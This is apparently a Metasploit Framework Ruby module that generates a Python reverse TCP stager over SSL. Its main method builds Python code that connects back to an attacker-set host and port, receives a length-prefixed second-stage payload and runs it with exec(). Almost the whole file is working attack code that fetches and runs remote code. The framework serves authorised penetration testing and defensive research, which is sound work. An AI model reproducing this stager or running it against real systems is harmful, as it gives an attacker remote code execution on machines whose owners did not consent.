# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/verify_ssl'
require 'msf/core/payload/python/reverse_tcp'

module Msf

###
#
# Complex reverse_tcp payload generation for Python
#
###

module Payload::Python::ReverseTcpSsl

  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseTcp
  include Msf::Payload::Windows::VerifySsl

  #
  # Generate the first stage
  #
  def generate
    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                         datastore['HandlerSSLCert'])
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      ssl:              true,
      verify_cert_hash: verify_cert_hash
    }

    generate_reverse_tcp_ssl(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp_ssl(opts)
  end

  def generate_reverse_tcp_ssl(opts={})
    # Set up the socket
    cmd  = "import ssl,socket,struct\n"
    cmd << "so=socket.socket(2,1)\n" # socket.AF_INET = 2
    cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
    cmd << "s=ssl.wrap_socket(so)\n"
    cmd << py_send_uuid if include_send_uuid
    cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd << "d=s.recv(l)\n"
    cmd << "while len(d)<l:\n"
    cmd << "\td+=s.recv(l-len(d))\n"
    cmd << "exec(d,{'s':s})\n"

    py_create_exec_stub(cmd)
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end

